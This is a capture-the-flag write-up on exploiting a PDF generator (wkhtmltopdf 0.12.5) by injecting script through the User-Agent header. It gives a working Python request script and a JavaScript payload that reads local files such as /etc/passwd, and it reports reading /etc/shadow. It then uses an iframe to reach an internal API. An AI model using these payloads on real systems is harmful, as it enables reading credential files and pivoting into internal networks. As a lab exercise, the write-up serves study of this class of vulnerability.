# PDFCARNAGE

For this challenge, we get a link to a website. Its only feature is to generate a pdf with custom content.

## Finding and exploiting the vulnerability

I first tried to find out which tool actually generates the pdf files. This was pretty simple to find, as I just had to open the file with e.g. Adobe Acrobat and look at the metadata.
The website seems to be running wkhtmltopdf 0.12.5!

I googled for exploits with this tool and quickly found out, that it has a XSS vulnerability which can be used for LFI (Local File Inclusion) of the backend. To exploit it, I just need to put my script into the User-Agent header. After playing around with it, I also found out that the generator prints out the result of the script, which really helps.

I used this code to quickly generate the pdfs:

```python
import requests
import time

with open("payload.html") as f:
    UA = f.read().replace("\n", "")

res = requests.post(
    "http://pdfcarnage.rumble.host/pdf",
    {"pdf_form": time.time()},
    headers={"User-Agent": UA},
)

with open("/tmp/pdf.pdf", "wb") as f:
    f.write(res.content)
```

And this payload to retrieve file contents:

```html
<script>
    x = new XMLHttpRequest();
    x.open('GET', 'file:///etc/passwd', false);
    x.send();
    document.write('<pre>' + x.responseText + '</pre>');
</script>
```

## Finding something useful

But how should we now find the flag? The usual places like /flag or /root/flag.txt are not available. By chance I found out that we can even read /etc/shadow but nothing unusual inside. I found the kind of web framework running by reading /etc/hostname (flask) and that the pdf is always temporarely saved inside /tmp/.

Then I actually found something interesting. /root/.bash_history contains something... 

```bash
cat /etc/passwd
top
ps
```

But this didn't lead me any further...

After another while of not finding anything, I found out that there is a nodeapi running in another container by reading /etc/hosts!

## The API

Now we just have to find the proper endpoint. The port for the API was 3000 so I was able to call the api with

```html
<iframe src="http://172.16.5.54:3000"></iframe>
```

After some lucky guessing I also found out where the flag was:

```
http://172.16.5.54:3000/api/flag
```